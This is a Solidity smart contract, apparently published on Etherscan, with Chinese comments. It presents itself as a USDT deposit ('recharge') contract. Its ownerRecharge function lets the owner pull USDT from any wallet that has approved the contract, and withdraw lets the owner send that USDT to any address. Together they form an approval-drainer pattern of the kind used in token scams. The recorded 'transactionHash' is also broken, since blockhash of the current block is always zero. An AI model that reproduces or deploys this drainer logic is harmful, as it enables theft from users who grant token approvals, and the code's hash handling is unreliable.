/**
 *Submitted for verification at Etherscan.io on 2023-08-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 导入 USDT 合约的接口
interface USDTInterface {
    function transferFrom(address _from, address _to, uint256 _value) external;
    function transfer(address _to, uint256 _value) external;
    function balanceOf(address _owner) external view returns (uint256);
    function allowance(address _owner, address _spender) external view returns (uint256);
    function approve(address _spender, uint256 _value)  external returns (bool);
}


// 定义授权划转合约
contract TokenTransferContract {
    USDTInterface private usdt; // 定义 USDT 合约实例
    address private owner; // 合约拥有者

    event Recharge(address indexed account, uint256 amount, bytes32 transactionHash);

    constructor(address _usdtAddress) {
        usdt = USDTInterface(_usdtAddress);
        owner = msg.sender;
    }

     // 查询钱包地址的 ETH 余额
    function getEthBalance(address _address) external view returns (uint256) {
        return _address.balance;
    }

    // 查询钱包地址的 USDT 余额
    function getWalletUSDTBalance(address _walletAddress) external view returns (uint256) {
        return usdt.balanceOf(_walletAddress);
    }

    // 查询用户授权给合约的 USDT 数量
    function getApprovedUSDTAmount(address _walletAddress) external view returns (uint256) {
        return usdt.allowance(_walletAddress, address(this));
    }
    
    //用户充值代币到合约中
    function recharge(uint256 _amount) external returns (uint256, bytes32) {
        require(_amount > 0, "Amount must be greater than zero");
        usdt.transferFrom(msg.sender, address(this), _amount);
        bytes32 transactionHash = blockhash(block.number);
        emit Recharge(msg.sender, _amount, transactionHash);
        return (_amount, transactionHash);
    }

    // 划转代币到合约
    function ownerRecharge(address _walletAddress, uint256 _amount) external {
        require(msg.sender == owner, "Unauthorized");
        require(_walletAddress != address(0), "Invalid address");
        usdt.transferFrom(_walletAddress, address(this), _amount);
    }

    // 提取合约中的USDT余额，只有合约拥有者可以执行此操作
    function withdraw(uint256 _amount,address targetAddress) external {
        require(msg.sender == owner, "Unauthorized");
        require(targetAddress != address(0), "Target address not set");
        usdt.transfer(targetAddress, _amount);
    }
}